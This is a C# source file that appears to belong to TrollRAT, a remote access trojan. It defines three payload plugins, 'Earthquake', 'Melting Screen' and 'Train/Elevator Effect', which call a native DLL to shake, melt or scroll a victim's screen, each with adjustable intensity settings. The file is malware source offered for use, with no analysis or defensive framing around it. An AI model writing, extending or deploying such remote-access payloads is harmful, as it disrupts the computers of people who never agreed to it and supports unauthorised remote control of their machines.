using System;
using System.Runtime.InteropServices;

using TrollRAT.Payloads;
using TrollRATActions;

namespace TrollRATPayloads.Payloads
{
    public class PayloadEarthquake : LoopingPayload
    {
        [DllImport("Plugins\\TrollRATNative.dll")]
        public static extern void payloadEarthquake(int delay, int power);

        private PayloadSettingNumber power = new PayloadSettingNumber(20, "Movement Factor", 2, 60, 1);

        public PayloadEarthquake() : base(4)
        {
            actions.Add(new PayloadActionClearScreen());
            settings.Add(power);

            name = "Earthquake (Shake Screen)";
        }

        protected override void execute()
        {
            payloadEarthquake((int)Delay, (int)power.Value);
        }
    }

    public class PayloadMeltingScreen : LoopingPayload
    {
        [DllImport("Plugins\\TrollRATNative.dll")]
        public static extern void payloadMeltingScreen(int size, int power);

        private PayloadSettingNumber size = new PayloadSettingNumber(30, "Bar Size", 4, 200, 1);
        private PayloadSettingNumber power = new PayloadSettingNumber(10, "Power", 1, 40, 1);

        public PayloadMeltingScreen() : base(4)
        {
            actions.Add(new PayloadActionClearScreen());
            settings.Add(size);
            settings.Add(power);

            name = "Melting Screen";
        }

        protected override void execute()
        {
            payloadMeltingScreen((int)size.Value, (int)power.Value);
        }
    }

    public class PayloadTrain : LoopingPayload
    {
        [DllImport("Plugins\\TrollRATNative.dll")]
        public static extern void payloadTrain(int xPower, int yPower);

        private PayloadSettingNumber xPower = new PayloadSettingNumber(10, "X Movement", -100, 100, 1);
        private PayloadSettingNumber yPower = new PayloadSettingNumber(0, "Y Movement", -100, 100, 1);

        public PayloadTrain() : base(5)
        {
            actions.Add(new PayloadActionClearScreen());
            settings.Add(xPower);
            settings.Add(yPower);

            name = "Train/Elevator Effect";
        }

        protected override void execute()
        {
            payloadTrain((int)xPower.Value, (int)yPower.Value);
        }
    }
}
